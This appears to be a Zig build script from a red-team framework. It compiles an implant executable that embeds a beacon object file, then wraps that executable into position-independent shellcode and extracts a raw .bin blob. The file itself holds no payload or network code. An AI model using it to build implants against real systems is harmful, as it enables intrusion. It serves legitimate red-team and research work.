const std = @import("std");

pub fn build(b: *std.Build) void {
    const target = b.standardTargetOptions(.{});
    const optimize = b.standardOptimizeOption(.{});

    const osTagStr = @import("bof_launcher_lib").osTagStr;
    const cpuArchStr = @import("bof_launcher_lib").cpuArchStr;

    const bof_launcher_dep = b.dependency(
        "bof_launcher_lib",
        .{ .target = target, .optimize = optimize },
    );
    const bof_launcher_api_module = bof_launcher_dep.module("bof_launcher_api");
    const bof_launcher_lib = bof_launcher_dep.artifact(
        @import("bof_launcher_lib").libFileName(b.allocator, target, .static),
    );

    const bofs_dep = b.dependency("bof_launcher_bofs", .{ .optimize = optimize });
    const z_beacon = bofs_dep.artifact("z-beac0n.elf.x64");

    const shellcode_in_zig_dep = b.dependency("shellcode_in_zig", .{ .target = target, .optimize = optimize });

    //
    // Executable
    //
    const exe = b.addExecutable(.{
        .name = b.fmt("implant_executable_{s}_{s}", .{ osTagStr(target), cpuArchStr(target) }),
        .root_source_file = b.path("src/main.zig"),
        .target = target,
        .optimize = optimize,
    });
    exe.linkLibrary(bof_launcher_lib);
    exe.root_module.addImport("bof_launcher_api", bof_launcher_api_module);
    exe.root_module.addAnonymousImport("z_beacon_embed", .{
        .root_source_file = z_beacon.getEmittedBin(),
    });

    b.installArtifact(exe);

    //
    // Shellcode
    //
    const shellcode_name = b.fmt("implant_shellcode_{s}_{s}", .{ osTagStr(target), cpuArchStr(target) });
    const shellcode = b.addExecutable(.{
        .name = shellcode_name,
        .root_source_file = b.path("src/shellcode.zig"),
        .target = target,
        .optimize = .ReleaseSmall,
        .link_libc = false,
        .single_threaded = true,
    });
    shellcode.link_eh_frame_hdr = false;
    shellcode.link_emit_relocs = false;
    shellcode.use_llvm = true;
    shellcode.pie = true;
    shellcode.setLinkerScript(shellcode_in_zig_dep.path("src/linker.ld"));
    shellcode.root_module.addAnonymousImport("implant_executable_embed", .{
        .root_source_file = exe.getEmittedBin(),
    });
    shellcode.step.dependOn(&exe.step);

    b.installArtifact(shellcode);

    const copy = b.addObjCopy(shellcode.getEmittedBin(), .{ .format = .bin, .only_section = ".text" });
    const install = b.addInstallBinFile(copy.getOutput(), b.fmt("{s}.bin", .{shellcode_name}));
    b.getInstallStep().dependOn(&install.step);
}
